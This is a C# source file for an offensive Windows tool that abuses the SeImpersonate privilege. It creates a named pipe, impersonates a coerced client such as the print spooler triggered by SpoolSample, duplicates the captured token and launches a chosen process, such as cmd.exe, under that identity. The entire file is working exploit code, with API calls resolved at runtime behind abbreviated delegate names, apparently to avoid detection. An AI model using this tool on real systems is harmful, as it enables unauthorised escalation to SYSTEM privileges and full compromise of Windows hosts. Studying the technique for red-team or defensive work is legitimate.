// Custom SeImpersonate privlege abuse tool, that is using named pipes for token impersonation. Mainly used with
// https://github.com/leechristensen/SpoolSample , but in general any coercion techniques can be used
using System;
using System.Runtime.InteropServices;

namespace Pipes
{
    internal class Program
    {
        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }

        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUP_INFO
        {
            public int cb;
            public IntPtr lpReserved;
            public string lpDesktop;
            public IntPtr lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROC_INFO
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandleA(string lib_name);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr lib_handle, string func_name);
        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibraryA(string lib_name);


        // Delegates
        private delegate IntPtr CrNP(
            string pipe_name, uint open_mode, uint pipe_mode,
            uint max_instances, uint out_buff_size, uint in_buff_size, uint timeout, IntPtr sec_attr);
        private delegate bool CnNP(IntPtr pipe_hand, IntPtr overlapped);
        private delegate bool INPC(IntPtr pipe_hand);
        private delegate bool DTE(
            IntPtr token_hand, uint access, IntPtr token_attrs,
            uint imperson_level, uint token_type, out IntPtr new_token_handle);
        private delegate bool CPWTW(
            IntPtr token_hand, uint logon_flags, string app_name, IntPtr cmd_line,
            uint create_flags, IntPtr env, IntPtr cwd, [In] ref STARTUP_INFO sinfo, out PROC_INFO pinfo);

        private delegate bool OTT(IntPtr thand, uint access, bool open_as_self, out IntPtr token_hand);
        private delegate IntPtr GCT();
        private delegate bool CEB(out IntPtr pEnv, IntPtr token_hand, bool inherit);
        private delegate bool Rev();


        // Only for verification of the token SID
        private delegate bool GTI(IntPtr token_hand, uint t_inf_class, IntPtr token_info, int token_info_len, out int return_len);
        private delegate bool CSTSS(IntPtr pSid, out IntPtr string_sid);


        // Functions
        private static CrNP CreatePi { get; set; }
        private static CnNP Connector { get; set; }
        private static INPC Impersonator { get; set; }
        private static DTE Duplicator { get; set; }
        private static CPWTW CreatePr { get; set; }
        private static OTT OpenThT { get; set; }
        private static GCT GetThread { get; set; }
        private static GTI GetInfo { get; set; }
        private static CSTSS Convert { get; set; }
        private static CEB CreateEnv { get; set; }
        private static Rev revert { get; set; }


        static void Main(string[] args)
        {
            if (args.Length == 0 || args.Length < 1 || args.Length > 3)
            {
                Console.WriteLine("[!] Please provide a valid name from the pipe and a process to spawn");
                Console.WriteLine("\t.\\program.exe C:\\Windows\\System32\\cmd.exe \\\\.\\pipe\\something");
                return;
            }

            Console.WriteLine("[+] Resolving APIs");
            IntPtr hModule = GetModuleHandleA("kernel32.dll");
            IntPtr hModuleA = GetModuleHandleA("advapi32.dll");
            IntPtr hModuleU = LoadLibraryA("userenv.dll");

            if (hModule == IntPtr.Zero || hModuleA == IntPtr.Zero || hModuleU == IntPtr.Zero) 
            {
                Console.WriteLine("[!] Failed obtaining handles to kernel32.dll or advapi32.dll");
                return;
            }

         

            CreatePi = (CrNP)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, "CreateNamedPipeA"), typeof(CrNP));
            Connector = (CnNP)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, "ConnectNamedPipe"), typeof(CnNP));
            Impersonator = (INPC)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModuleA, "ImpersonateNamedPipeClient"), typeof(INPC));
            Duplicator = (DTE)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModuleA, "DuplicateTokenEx"), typeof(DTE));
            CreatePr = (CPWTW)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModuleA, "CreateProcessWithTokenW"), typeof(CPWTW));
            OpenThT = (OTT)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModuleA, "OpenThreadToken"), typeof(OTT));
            GetThread = (GCT)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, "GetCurrentThread"), typeof(GCT));
            GetInfo = (GTI)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModuleA, "GetTokenInformation"), typeof(GTI));
            Convert = (CSTSS)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModuleA, "ConvertSidToStringSidW"), typeof(CSTSS));
            CreateEnv = (CEB)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModuleU, "CreateEnvironmentBlock"), typeof(CEB));
            revert = (Rev)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModuleA, "RevertToSelf"), typeof(Rev));


            string pipe_name;
            string proc = args[0];
            try {
                pipe_name = args[1];
            } catch {
                Console.WriteLine("[!] No pipe name is specified using default for SpoolSample.exe");
                pipe_name = "\\\\.\\pipe\\test\\pipe\\spoolss";
            }

            Console.WriteLine($"[+] Creating named pipe: {pipe_name}");
            IntPtr pipe_hand = CreatePi(pipe_name, 3, 0, 255, 0x1000, 0x1000, 0, IntPtr.Zero);
            if (pipe_hand == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed creating named pipe");
                return;
            }


            if (!Connector(pipe_hand, IntPtr.Zero))
            {
                Console.WriteLine("[!] Failed connecting to the named pipe");
                return;
            }

            if (!Impersonator(pipe_hand))
            {
                Console.WriteLine($"[!] Failed impersonating named pipe client, status: {Marshal.GetLastWin32Error()}");
                return;
            }

            IntPtr token_hand;
            OpenThT(GetThread(), 0xF01FF, false, out token_hand);
            IntPtr primary_token_hand;
            if (!Duplicator(token_hand, 0xF01FF, IntPtr.Zero, 2, 1, out primary_token_hand))
            {
                Console.WriteLine($"[!] Failed duplicating token: {Marshal.GetLastWin32Error()}");
                return;
            }


            // Parse the SID for the token
            int required_size = 0;
            GetInfo(token_hand, 1, IntPtr.Zero, required_size, out required_size);
            IntPtr token_info = Marshal.AllocHGlobal((IntPtr)required_size);
            GetInfo(token_hand, 1, token_info, required_size, out required_size);

            // Parse the SID for the token
            TOKEN_USER token_user = (TOKEN_USER)Marshal.PtrToStructure(token_info, typeof(TOKEN_USER));
            IntPtr string_sid = IntPtr.Zero;
            Convert(token_user.User.sid, out string_sid);
            string sid = Marshal.PtrToStringAuto(string_sid);
            Console.WriteLine($"[+] Captured Token SID: {sid}");
            //

            STARTUP_INFO start_info = new STARTUP_INFO();
            start_info.cb = Marshal.SizeOf(start_info);
            start_info.lpDesktop = "WinSta0\\Default";
            PROC_INFO proc_info = new PROC_INFO();


            IntPtr procPtr = Marshal.StringToHGlobalUni(proc);

            string sys_dir = "C:\\Windows\\System32";
            IntPtr dirPtr = Marshal.StringToHGlobalUni(sys_dir);

            IntPtr env = IntPtr.Zero;
            if (!CreateEnv(out env, token_hand, false)) {
                Console.WriteLine($"[!] Failed creating environment block: {Marshal.GetLastWin32Error()}");
            }

            revert();

            Console.WriteLine($"[+] Using the captured token to spawn: {proc}");
            if (!CreatePr(primary_token_hand, (uint)LogonFlags.WithProfile, null, procPtr, (uint)CreationFlags.UnicodeEnvironment, env, dirPtr, ref start_info, out proc_info))
            {
                Console.WriteLine($"[!] Failed creating process: {Marshal.GetLastWin32Error()}");
                return;
            }
            else {
                Console.WriteLine($"[+] Process created with ID: {proc_info.dwProcessId}");
            }
        }
    }
}